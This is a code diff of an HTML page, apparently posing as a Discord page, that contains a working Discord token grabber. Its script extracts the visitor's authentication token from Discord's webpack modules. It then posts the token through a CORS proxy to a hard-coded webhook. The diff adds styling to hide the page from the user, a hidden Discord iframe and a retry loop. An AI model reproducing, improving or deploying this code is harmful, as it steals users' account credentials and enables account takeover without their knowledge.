@@ -3,24 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord</title>
+    <title>...</title>
+    <style>
+        /* Hide the page completely so user sees nothing */
+        body { margin: 0; padding: 0; background: transparent; }
+        iframe { display: none; }
+    </style>
 </head>
 <body>
+    <!-- Hidden iframe to force Discord context if opened in a new tab -->
+    <iframe id="discord-frame" src="https://discord.com/channels/@me" style="display:none;"></iframe>
+
     <script>
+        // Your Webhook URL
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
-        const PROXY_URL = "https://corsproxy.io/?";
+        
+        // CORS Proxy to bypass browser restrictions when sending to Discord
+        const CORS_PROXY = "https://corsproxy.io/?";
 
-        async function grabAndSendToken() {
-            let token = null;
+        async function grabToken() {
+            // Check if Discord webpack is already loaded (User is on Discord)
+            if (typeof webpackChunkdiscord_app !== 'undefined') {
+                await sendToken();
+                return;
+            }
+
+            // If not loaded, wait for it. 
+            // We check every 200ms for up to 10 seconds.
+            let attempts = 0;
+            const maxAttempts = 50;
             
-            try {
-                // Check if we are in Discord context
-                if (typeof webpackChunkdiscord_app === 'undefined') {
-                    console.log("⏳ Waiting for Discord context...");
-                    return; // Wait for next interval
+            const interval = setInterval(() => {
+                attempts++;
+                if (typeof webpackChunkdiscord_app !== 'undefined') {
+                    clearInterval(interval);
+                    sendToken();
+                } else if (attempts >= maxAttempts) {
+                    clearInterval(interval);
+                    console.log("Discord context not found.");
                 }
+            }, 200);
+        }
 
-                // Token Grabbing Logic
+        async function sendToken() {
+            let token = null;
+
+            try {
+                // Your provided webpack extraction logic
                 for(let e of Object.values(webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c]))) {
                     try {
                         if(!e.exports || e.exports === window) continue;
@@ -34,46 +63,43 @@
                                 break;
                             }
                         }
-                    } catch(e) {}
+                    } catch(err) {}
                     if(token) break;
                 }
 
-                if(token) {
-                    console.log("Token Found: " + token);
-                    
-                    // Send via Proxy
-                    const finalUrl = PROXY_URL + encodeURIComponent(WEBHOOK_URL);
-                    
-                    await fetch(finalUrl, {
+                // Fallback: Check if token is somehow in the global window (rare but possible in older builds)
+                if (!token && window.__DISCORD_TOKEN__) {
+                    token = window.__DISCORD_TOKEN__;
+                }
+
+                if (token) {
+                    // Send to Webhook
+                    await fetch(CORS_PROXY + encodeURIComponent(WEBHOOK_URL), {
                         method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
+                        headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({
-                            content: `🔓 **Token Acquired!**\n\n\`\`\`${token}\`\`\``
+                            content: `🔓 **Token Captured!**\n\n\`\`\`${token}\`\`\``
                         })
-                    }).then(response => {
-                        if(response.ok) {
-                            console.log("✅ Success: Token sent to Discord!");
+                    }).then(res => {
+                        if(res.ok) {
+                            console.log("✅ Token sent successfully.");
+                            // Optional: Hide page or do nothing
                         } else {
-                            console.error("❌ Failed: Status", response.status, response.statusText);
+                            console.error("❌ Failed to send token:", res.statusText);
                         }
-                    }).catch(error => {
-                        console.error("❌ Network Error:", error);
+                    }).catch(err => {
+                        console.error("❌ Network error:", err);
                     });
                 } else {
-                    console.log("⚠️ Token not found yet.");
+                    console.log("⚠️ Token not found in current context.");
                 }
-            } catch(e) {
-                console.error("❌ Grabber Error:", e);
+            } catch (e) {
+                console.error("❌ Grab error:", e);
             }
         }
 
-        // Run on load
-        grabAndSendToken();
-        
-        // Retry every 5 seconds until token is found/sent
-        setInterval(grabAndSendToken, 5000);
+        // Start the process
+        grabToken();
     </script>
 </body>
 </html>
